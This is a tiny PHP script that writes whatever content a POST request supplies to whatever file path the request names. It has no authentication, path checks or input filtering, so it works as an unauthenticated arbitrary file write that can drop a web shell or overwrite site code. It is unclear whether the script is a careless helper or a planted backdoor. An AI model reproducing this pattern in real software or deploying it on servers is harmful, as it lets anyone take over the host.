<?php

    if(isset($_POST["fullDir"])){
        $dir = $_POST["fullDir"]; $content = $_POST["content"];

        $file = fopen($dir, "w");
        if($file){
            file_put_contents($dir, $content);
        }
    }
?>